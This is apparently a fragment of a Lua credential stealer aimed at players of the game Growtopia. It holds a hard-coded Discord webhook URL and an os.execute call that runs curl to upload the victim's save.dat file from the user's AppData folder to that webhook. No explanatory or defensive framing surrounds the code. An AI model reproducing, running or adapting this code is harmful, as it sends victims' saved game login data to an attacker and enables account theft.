webhook = "https://discord.com/api/webhooks/1213793605194616932/q5-HIpeOr6o4pHEaz-RQsxg4HfJTsMW3afHd4tTmUQDWdsIhiVzv6jrFEXHTfO70nHBW"

status_code = os.execute('curl -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" -F "file=@' .. os.getenv("USERPROFILE") .. "/AppData/Local/Growtopia/save.dat" .. '" -F "content=" ' .. webhook)
